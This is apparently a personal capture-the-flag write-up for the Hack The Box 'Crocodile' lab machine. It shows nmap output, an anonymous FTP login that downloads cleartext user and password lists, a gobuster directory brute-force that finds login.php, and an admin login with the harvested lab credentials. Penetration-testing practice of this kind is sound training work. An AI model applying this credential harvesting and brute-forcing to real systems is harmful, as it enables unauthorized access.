#### About

Crocodile is a very easy Linux machine which showcases the dangers of misconfigured authentication and sensitive data exposure. A vulnerable FTP server instance is misconfigured to allow anonymous authentication and upon enumerating the server, sensitive files can be found containing cleartext credentials. Enumerating and fuzzing the website will reveal a hidden login endpoint where the previously acquired credentials can be used to gain access to the admin panel.

date : 2 April 2026

- - - 
## What I did

```bash
Nmap scan report for 10.129.57.22
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.89
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 374.58 seconds

```


```bash
> ftp 10.129.57.22
Connected to 10.129.57.22.
220 (vsFTPd 3.0.3)
Name (10.129.57.22:guillaume): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

ftp> get allowed.userlist.passwd ftp-passwd.txt
local: ftp-passwd.txt remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||42304|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |***********************************|    62      517.49 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (0.19 KiB/s)
ftp> get allowed.userlist ftp-users.txt
local: ftp-users.txt remote: allowed.userlist
229 Entering Extended Passive Mode (|||48190|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |***********************************|    33      285.19 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.10 KiB/s)
ftp> exit
221 Goodbye.

```

```bash

> cat ftp-users.txt
aron
pwnmeow
egotisticalsw
admin
> cat ftp-passwd.txt
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```


gobuster dir search for specific filetypes : `-x`


```bash
> gobuster dir -x php -t 50 --url  http://10.129.57.22 --wordlist Documents/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.57.22
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                Documents/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.129.57.22/assets/]
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 301) [Size: 310] [--> http://10.129.57.22/css/]
/dashboard            (Status: 301) [Size: 316] [--> http://10.129.57.22/dashboard/]
/fonts                (Status: 301) [Size: 312] [--> http://10.129.57.22/fonts/]
/index.html           (Status: 200) [Size: 58565]
/js                   (Status: 301) [Size: 309] [--> http://10.129.57.22/js/]
/login.php            (Status: 200) [Size: 1577]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/server-status        (Status: 403) [Size: 277]
Progress: 9502 / 9502 (100.00%)
===============================================================
Finished
===============================================================

```

With gobuster we scan the host for php files using the common web discovery seclist to find subdirectories, files within the machine in search for a login or admin php file.


` > gobuster dir -x php -t 50 --url  http://10.129.57.22 --wordlist Documents/SecLists/Discovery/Web-Content/common.txt`

dir = search for subdirectories
-x php : search for php filetypes
-t 50 : faster search rate
--url : the host which we want to scan
--wordlist : the path for the wordlist we want to use to bruteforce the host.

The scan found an interesting `login.php` login panel.

When we used FTP to transfer files from the host, we had a user and password list containing admin user and password.

admin : rKXM59ESxesUFHAd

We use these credentials to login into the dashboard and to find the flag.

![dashboard](images/Dashboard-login.png)


## What I learned
